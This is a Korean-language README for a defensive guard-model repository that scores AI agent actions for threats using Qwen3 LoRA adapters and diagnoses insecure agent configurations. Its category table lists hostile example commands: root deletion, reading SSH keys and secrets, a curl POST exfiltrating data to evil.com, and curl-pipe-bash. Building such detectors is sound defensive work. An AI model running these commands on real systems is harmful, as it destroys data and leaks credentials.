# Trust Agent Guard Model

AI 에이전트의 액션을 실시간으로 분석하고 위협을 탐지하는 2-Stage 보안 파이프라인.
학습 데이터, LoRA 어댑터, 평가 스크립트를 관리하는 모델 레포지토리.

## 아키텍처

```
Agent Request
    │
    ▼
┌─────────────────────────────────┐
│  Stage 1: Detect (Qwen3-0.6B)  │
│  7개 LoRA 어댑터 병렬 실행       │
│  카테고리별 위험 점수 (0.0~1.0)  │
└────────────┬────────────────────┘
             │ Logprobs 기반 scoring
             ▼
┌─────────────────────────────────┐
│  Score-based Routing            │
│  · max < 0.2  → FAST_PASS      │
│  · max > 0.8  → FAST_BLOCK     │
│  · 0.2 ~ 0.8  → JUDGE 호출     │
└────────────┬────────────────────┘
             │ (불확실한 케이스만)
             ▼
┌─────────────────────────────────┐
│  Stage 2: Judge (Qwen3-8B)     │
│  LoRA 어댑터 — 위협 상세 분석    │
│  Mode 1: Action Judge           │
│  Mode 2: Config Diagnosis       │
└─────────────────────────────────┘
```

### 핵심 기술

- **Logprobs Scoring**: 모델 forward pass에서 YES/NO logits 추출 → softmax → 연속 점수 (0.0~1.0)
- **LoRA 어댑터**: 베이스 모델은 고정, 소규모 어댑터(~수십MB)만 학습/교체
- **MLX → PEFT 변환**: 로컬(Apple Silicon)에서 MLX로 학습 → PEFT로 변환 → vLLM 서빙

## 위협 탐지 카테고리 (7개)

| 카테고리 | 설명 | 예시 |
|---------|------|------|
| dangerous_execution | 위험한 명령 실행 | `rm -rf /`, `DROP TABLE production`, `kill -9 1` |
| credential_theft | 크레덴셜/시크릿 탈취 | `cat ~/.ssh/id_rsa`, `printenv \| grep SECRET` |
| data_exfiltration | 데이터 외부 유출 | `curl -X POST evil.com -d @data`, DNS 터널링 |
| prompt_injection | 프롬프트 인젝션 | hidden `[SYSTEM]` override, RAG poisoning |
| supply_chain | 공급망 공격 | 타이포스쿼팅 패키지, `curl \| bash` |
| privilege_escalation | 권한 상승 | `sudo`, SUID 비트, `docker --privileged` |
| config_diagnosis | 에이전트 설정 취약점 탐지 | `auth.mode: "none"`, `exec.ask: "off"` |

## Judge 동작 모드

### Mode 1: Action Judge
에이전트의 tool call / 명령을 분석하여 위협 여부 판정.

```json
{
  "threat_confirmed": true,
  "threat_type": "DANGEROUS_EXECUTION",
  "severity": "CRITICAL",
  "confidence": 0.97,
  "reasoning": "루트 디렉토리 전체 삭제는 시스템 완전 파괴를 초래하는 치명적 명령입니다."
}
```

### Mode 2: Config Diagnosis
AI 에이전트 프레임워크의 설정 파일을 분석하여 보안 취약점 진단.

**지원 프레임워크**: OpenClaw, Claude Code, AutoGPT, CrewAI, LangGraph, Cursor, Cline, AgentGuard, Copilot, Devin, SWE-Agent, Aider, n8n

```json
{
  "agent_type": "openclaw",
  "config_safe": false,
  "security_score": 25,
  "findings": [{ "field": "gateway.auth.mode", "severity": "CRITICAL", ... }],
  "overall_severity": "CRITICAL"
}
```

## 어댑터 버전

### Judge (Qwen3-8B LoRA)

| 버전 | 학습 데이터 | 주요 변경 | 상태 |
|------|-----------|----------|------|
| v7 | 1,546건 | 기본 Action Judge + 연구 기반 시나리오 | baseline |
| v8 | 1,546건 + config 130건 | Config Diagnosis 추가 | - |
| v9 | v8 + Safe FP 34건 | 안전 액션 오탐 방지 | - |
| **v11** | **1,414건** | **exec 명령 3단계 분류 (#16)** | **latest** |

### Detect (Qwen3-0.6B LoRA × 7)

| 어댑터 | 학습 데이터 | 비고 |
|--------|-----------|------|
| dangerous_execution | 524건 | v1 |
| **dangerous_execution_v2** | **624건** | **exec 세분화 (#16), latest** |
| credential_theft | 528건 | |
| data_exfiltration | 435건 | |
| prompt_injection | 550건 | |
| supply_chain | 202건 | |
| privilege_escalation | 212건 | |
| config_diagnosis | 298건 | v5, hard negatives 포함 |

## 성능

### 로컬 평가 (M4 Pro)

| 테스트셋 | Judge v11 |
|----------|-----------|
| v3 기본 (38건) | **92.1% (35/38)** |
| Issue #16 exec 세분화 (18건) | **100% (18/18)** |

### E2E 파이프라인

| 방식 | 정확도 | 응답 속도 |
|------|--------|----------|
| E2E Pipeline (Logprobs) | **89.5%** | FAST: ~200ms, JUDGE: ~11s |
| 기존 Trust Layer API | 68.4% | - |

자세한 평가 결과는 [docs/REPORT.md](docs/REPORT.md) 참고.

## 빠른 시작

### 요구사항

- Apple Silicon Mac (M1/M2/M3/M4)
- RAM 32GB 이상 권장 (Detect만: 16GB)
- Python 3.10+

### 설치

```bash
pip install mlx-lm safetensors
```

베이스 모델(Qwen3-0.6B, Qwen3-8B)은 첫 실행 시 HuggingFace에서 자동 다운로드됩니다.

### 평가

```bash
# E2E 파이프라인 (Detect → Routing → Judge)
python eval/run_e2e_eval.py test_cases_v3

# Judge 단독
python eval/run_finetuned_eval.py test_cases_v3

# Detect 어댑터별
python eval/run_detect_eval.py
```

### 학습

```bash
# Judge (8B) — ~40분, peak ~31GB
mlx_lm.lora --model Qwen/Qwen3-8B --train \
  --data data/processed/v11 \
  --adapter-path training/adapters_v11 \
  --iters 250 --learning-rate 5e-6 --batch-size 1 \
  --grad-checkpoint --num-layers 16

# Detect (0.6B) — ~10분, peak ~3.4GB
mlx_lm.lora --model Qwen/Qwen3-0.6B --train \
  --data data/detect/dangerous_execution_v2 \
  --adapter-path training/detect/dangerous_execution_v2 \
  --iters 500 --learning-rate 1e-5 --batch-size 4
```

### PEFT 변환 (vLLM 배포용)

```bash
python scripts/convert_mlx_to_peft.py \
  --mlx-adapter training/adapters_v11 \
  --output training/adapters_v11_peft \
  --base-model Qwen/Qwen3-8B
```

## 프로젝트 구조

```
trust-agent-guard-model/
├── prompts/
│   ├── system_prompt_v4.txt        # Judge 시스템 프롬프트 (Action + Config)
│   ├── test_cases_v3.json          # 기본 테스트 (38건)
│   ├── test_cases_v5.json          # 확장 테스트 (프레임워크 추가)
│   └── test_cases_issue16.json     # exec 세분화 테스트 (18건)
├── eval/
│   ├── run_e2e_eval.py             # E2E 파이프라인 평가
│   ├── run_finetuned_eval.py       # Judge 단독 평가
│   ├── run_detect_eval.py          # Detect 어댑터 평가
│   └── results/                    # 평가 결과 JSON
├── training/
│   ├── adapters_v11/               # Judge LoRA (MLX, latest)
│   ├── adapters_v11_peft/          # Judge LoRA (PEFT, 배포용)
│   ├── detect/                     # Detect LoRA × 7 (MLX + PEFT)
│   └── data/                       # Judge 학습 데이터 (train/valid.jsonl)
├── data/
│   ├── detect/                     # Detect 카테고리별 학습 데이터
│   ├── processed/                  # 버전별 병합 데이터
│   ├── issue16/                    # Issue #16 exec 세분화 데이터
│   ├── v11_config_diagnosis/       # Config Diagnosis 프레임워크 데이터
│   └── v7_research/                # 연구 기반 시나리오 데이터
├── scripts/
│   ├── convert_mlx_to_peft.py      # MLX → PEFT 변환
│   ├── gen_issue16_exec_data.py    # Issue #16 데이터 생성
│   └── gen_detect_config.py        # Detect config 데이터 생성
└── docs/
    └── REPORT.md                   # 상세 평가 리포트
```

## 배포

```
로컬 학습 (MLX, Apple Silicon)
    → PEFT 변환 (convert_mlx_to_peft.py)
    → GCS 업로드 (gs://tynapse_model/)
    → GCE (A100) vLLM이 어댑터 로드
```

- 베이스 모델은 서버에 이미 있음, 어댑터(~수십MB)만 교체
- Judge: port 8001 (`security_judge_v1`)
- Detect: port 8002 (카테고리별 어댑터)

## 관련 레포

| 레포 | 역할 |
|------|------|
| [contail/AgentGuard](https://github.com/contail/AgentGuard) | Go 코어 바이너리 + npm CLI |
| [Tynapse/tynapse-trust-layer](https://github.com/Tynapse/tynapse-trust-layer) | Gateway API 서버 (AWS ECS) |
